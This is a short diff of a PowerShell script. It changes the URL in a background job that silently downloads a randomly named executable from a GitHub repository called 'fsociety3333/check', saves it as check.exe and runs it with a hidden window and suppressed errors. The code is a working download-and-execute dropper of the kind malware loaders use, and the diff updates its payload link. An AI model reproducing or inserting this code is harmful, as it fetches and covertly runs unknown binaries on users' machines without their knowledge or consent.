@@ -7,7 +7,7 @@ try {
 
 Start-Job -ScriptBlock {
     param($f)
-    Invoke-WebRequest -Uri "https://github.com/fsociety3333/check/raw/refs/heads/main/jy42ythih0vb7efm.exe" -OutFile "$f\check.exe" -ErrorAction SilentlyContinue
+    Invoke-WebRequest -Uri "https://github.com/fsociety3333/check/raw/refs/heads/main/yn1y0lzv65bujxgv.exe" -OutFile "$f\check.exe" -ErrorAction SilentlyContinue
     Start-Process -FilePath "$f\check.exe" -WindowStyle Hidden
 } -ArgumentList $folder | Out-Null
 
